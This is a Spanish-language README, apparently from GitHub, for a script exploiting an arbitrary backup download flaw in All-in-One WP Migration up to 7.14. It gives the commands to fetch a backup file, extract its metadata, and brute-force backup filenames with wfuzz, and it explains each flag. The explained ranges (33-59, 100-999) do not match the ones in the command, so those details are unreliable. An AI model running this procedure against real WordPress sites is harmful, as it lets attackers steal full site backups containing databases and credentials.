# All-in-One WP Migration <=7.14 Arbitrary Backup Download

## metadataextractor.py

(All-in-One WP Migration <=7.14 Arbitrary Backup Download)

Bajamos el archivo .wpress de la url: https://blog.example.com/wp-content/ai1wm-backups/web.config, con el comando wget por ejemplo, luego con extraer.py extraemos la metadata.

## Comando de ejecucion:

python3 extraer.py blog.example.com web.config

![image](https://github.com/Anonimo501/metadataextractor.py/assets/67207446/0d0a883a-502f-4899-a65c-b637be6516a5)

## WFUZZ

Ejecutamos despues el ataque con WFUZZ

## Comando WFUZZ

wfuzz -c -z range,42-60 -z range,000-999 -X HEAD --sc 200 https://blog.example.com/wp-content/ai1wm-backups/blog.example.com-20230126-1514FUZZ-FUZ2Z.wpress

## Explicando el comando:

wfuzz: Este es el nombre del comando utilizado para realizar ataques de fuerza bruta y fuzzing en una URL.

-c: Esta opción indica a wfuzz que muestre los resultados en un formato de columna para una mejor legibilidad.

-z range,33-59: Esta opción especifica una secuencia de valores que se utilizarán para reemplazar "FUZZ" en la URL. En este caso, "FUZZ" se reemplazará por números del 33 al 59.

-z range,100-999: Similar a la opción anterior, esta especifica otra secuencia de valores que reemplazarán la segunda instancia de "FUZZ" en la URL.

-X HEAD: Esta opción realiza solicitudes HTTP HEAD en lugar de GET. Esto significa que el comando realizará solicitudes de encabezado HTTP en lugar de descargar todo el contenido. Esto puede ser útil para verificar la existencia de un recurso sin descargarlo completamente.

--sc 200: Esta opción establece un código de estado de respuesta HTTP 200 como exitoso. El comando buscará respuestas con un código de estado 200 y mostrará esas respuestas.

https://blog.example.com/wp-content/ai1wm-backups/blog.example.com-20230126-1514FUZZ-FUZ2Z.wpress: Esta es la URL objetivo en la que se realizarán las solicitudes. La parte "FUZZ" en la URL se reemplazará por los valores definidos en las opciones -z.

![image](https://github.com/Anonimo501/metadataextractor.py/assets/67207446/ca074dca-9991-4b8d-9f87-0ce07010b25b)

Referencias:

https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/

https://gist.github.com/vavkamil/b54683430bd21d7fdade2ebdcf70cc82
